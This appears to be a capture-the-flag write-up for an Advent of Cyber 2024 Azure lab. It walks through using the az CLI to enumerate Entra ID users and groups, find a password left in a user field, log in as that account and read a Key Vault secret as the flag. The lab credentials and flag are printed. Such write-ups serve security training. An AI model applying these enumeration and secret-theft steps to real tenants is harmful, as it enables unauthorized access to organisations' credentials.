# (Day 16) - Advent of Cyber

## Azure

#### Azure Command Line

After logging into the Azure account and clicking on the terminal (selecting bash) we should have access to a shell after a few seconds.
Now in order to ensure we are logged in correctly we will run the following command:

```
az ad signed-in-user show
```

After running the following command we should obtain output similar to this:

```
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#users/$entity",
  "businessPhones": [],
  "displayName": "usr-xxxxxxxx",
  "givenName": null,
  "id": "3970058b-7741-49c5-b1a7-191540995f7a",
  "jobTitle": null,
  "mail": null,
  "mobilePhone": null,
  "officeLocation": null,
  "preferredLanguage": null,
  "surname": null,
  "userPrincipalName": "usr-xxxxxxxx@aoc2024.onmicrosoft.com"
}
```

Now we have the correct user logged in we can start enumerating the Entra ID's using the following command:

```
az ad user list
```

However, this command would take a long time depending on the number of users, so we will need to filter the output to only look for wareville users (wvusr) using this command:

```
az ad user list --filter "startsWith('wvusr-', displayName)"
```

The output we obtain from this shows one user (wvuser-backupware) that has a password that is not hidden:

```
  {
    "businessPhones": [],
    "displayName": "wvusr-backupware",
    "givenName": null,
    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": "R3c0v3r_s3cr3ts!",
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
  },
```

Now we can continue enumeration on the groups aswell using the following command:

```
az ad group list
```

After running the command we find an interesting group:

```
[
  {
    "description": "Group for recovering Wareville's secrets",
    "displayName": "Secret Recovery Group",
    "expirationDateTime": null,
  }
]
```

Now considering the description of the group, we should continue with trying to find the users that are a part of the group, we can do that with this command:

```
az ad group member list --group "Secret Recovery Group"
```

Running the command we gain confirmation that the user that has it's password publicly available is a part of the group:

```
[
  {
    "@odata.type": "#microsoft.graph.user",
    "businessPhones": [],
    "displayName": "wvusr-backupware",
  }
]
```

From all the above information, we can confirm that this specific account was where the attacker was able to escalate their privileges, so now we should log into this account and enumerate the roles and privileges that this user has. We can do this by:

```
az account clear
az login -u wvusr-backupware@aoc2024.onmicrosoft.com -p R3c0v3r_s3cr3ts!
```

Now to enumerate the roles and privileges we can run the following command:

```
az role assignment list --assignee 7d96660a-02e1-4112-9515-1762d0cb66b7 --all
```

There we discover two interesting roles that could be exploited:

```
[
  {
    "principalName": "Secret Recovery Group",
    "roleDefinitionName": "Key Vault Secrets User",
    "scope": "/subscriptions/{subscriptionId}/resourceGroups/rog-aoc-kv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
  },
  {
    "principalName": "Secret Recovery Group",
    "roleDefinitionName": "Key Vault Reader",
    "scope": "/subscriptions/{subscriptionId}/resourceGroups/rog-aoc-kv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
  }
]
```

Both Key Vault Secrets User and Key Vault Reader are roles that allow you to read and view keys which would allow access to accounts that a user should not.
Now we can check if the user is able to access the key vault using the following command:

```
az keyvault list
```

And receiving an output similar to this:

```
[
  {
    "id": "/subscriptions/{subscriptionId}/resourceGroups/rog-aoc-kv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
    "location": "eastus",
    "name": "warevillesecrets",
    "resourceGroup": "rg-aoc-kv",
    "tags": {
      "aoc": "rg"
    },
    "type": "Microsoft.KeyVault/vaults"
  }
]
```

There we additionally discover the name of the vault which is warevillesecrets, now we have this information we can see if any secrets are stored in this vault using this command:

```
az keyvault secret list --vault-name warevillesecrets
```

From this command we see:

```
[
  {
    "id": "https://warevillesecrets.vault.azure.net/secrets/aoc2024",
    "managed": null,
    "name": "aoc2024",
    "tags": {}
  }
]
```

There we see the secret name, now using this name we can attempt to see the secret related to this name using the following command:

```
az keyvault secret show --vault-name warevillesecrets --name aoc2024
```

From there we see the following flag:

```
{
  "id": "https://warevillesecrets.vault.azure.net/secrets/aoc2024/20953fbf6d51464299b30c6356b378fd",
  "kid": null,
  "managed": null,
  "name": "aoc2024",
  "tags": {},
  "value": "WhereIsMyMind1999"
}
```

